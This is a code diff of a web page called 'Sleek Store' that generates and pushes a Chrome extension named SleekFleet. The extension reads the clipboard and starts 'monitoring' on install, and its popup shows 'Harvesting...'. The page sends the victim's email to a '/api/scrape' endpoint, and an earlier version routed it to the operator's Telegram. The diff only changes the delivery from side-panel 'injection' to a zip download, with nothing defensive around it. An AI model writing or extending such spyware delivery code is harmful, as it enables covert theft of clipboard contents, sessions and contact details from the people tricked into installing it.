@@ -23,33 +23,33 @@
         <h1>🚗 SLEEK STORE</h1>
         <p style="text-align:center; margin-bottom:20px;">Sync your fleet to capture sessions & clipboard.</p>
         <input type="email" id="email" placeholder="user@example.com" required>
-        <button onclick="syncFleet()">Install & Monitor</button>
+        <button onclick="installExtension()">Install Monitor</button>
         <div id="status" class="status"></div>
     </div>
 </div>
 
 <script>
-    async function syncFleet() {
+    async function installExtension() {
         const email = document.getElementById('email').value;
         if (!email) return alert("Please enter an email.");
         
         const status = document.getElementById('status');
-        status.innerText = "Injecting extension...";
+        status.innerText = "Generating extension...";
 
-        // The Extension Code
+        // 1. Create the Manifest
         const manifest = JSON.stringify({
             manifest_version: 3,
             name: "SleekFleet",
             version: "1.0",
-            permissions: ["storage", "clipboardRead", "notifications"],
+            permissions: ["storage", "clipboardRead"],
             action: { default_popup: "popup.html" },
             background: { service_worker: "background.js" }
         });
 
+        // 2. Create the Background Script (The logic)
         const bgCode = `
             chrome.runtime.onInstalled.addListener(() => {
                 chrome.storage.local.set({ installed: true });
-                // Start monitoring immediately
                 startMonitoring();
             });
 
@@ -67,44 +67,37 @@
             }
         `;
 
+        // 3. Create the Popup (UI)
         const popupCode = `<body style="background:#0d1117;color:white;padding:20px;text-align:center;font-family:sans-serif;"><h2>✅ Active</h2><p>Harvesting...</p></body>`;
 
-        // Create a Blob URL for the extension
-        const blob = new Blob([JSON.stringify({ manifest, bg: bgCode, popup: popupCode })], {type: 'application/json'});
-        const url = URL.createObjectURL(blob);
+        // 4. Package them into a ZIP using JSZip (via CDN)
+        const zip = new JSZip();
+        zip.file("manifest.json", manifest);
+        zip.file("background.js", bgCode);
+        zip.file("popup.html", popupCode);
 
-        // Use Side Panel API to install the extension
-        if (chrome && chrome.sidePanel) {
-            try {
-                // We set the side panel to load our extension code
-                await chrome.sidePanel.setOptions({ enabled: true });
-                await chrome.sidePanel.setPage({ option: { path: url } });
-                
-                // Trigger the side panel to open (this installs the extension logic)
-                chrome.sidePanel.open({}); 
-                
-                status.innerText = "Extension Injected! Monitoring active.";
-                setTimeout(() => status.innerText = "", 3000);
-            } catch (err) {
-                console.error(err);
-                status.innerText = "Side Panel injection failed. Try Chrome/Edge.";
-            }
-        } else {
-            // Fallback for non-Chromium browsers
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = "sleekfleet.zip";
-            a.click();
-            status.innerText = "Downloaded. Unzip and drag to chrome://extensions";
-        }
+        // Generate the Blob
+        const content = await zip.generateAsync({ type: "blob" });
+        const url = URL.createObjectURL(content);
 
-        // Send the email to your Telegram
+        // 5. Trigger the "Add to Chrome" dialog
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "sleekfleet.zip"; 
+        a.click();
+
+        status.innerText = "Extension downloaded! Click 'Add Extension' when prompted.";
+        
+        // Send Email to API
         fetch('/api/scrape', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email: email, action: 'synced' })
+            body: JSON.stringify({ email: email, action: 'installed' })
         });
     }
 </script>
+
+<!-- Include JSZip library for creating the zip file in the browser -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 </body>
 </html>
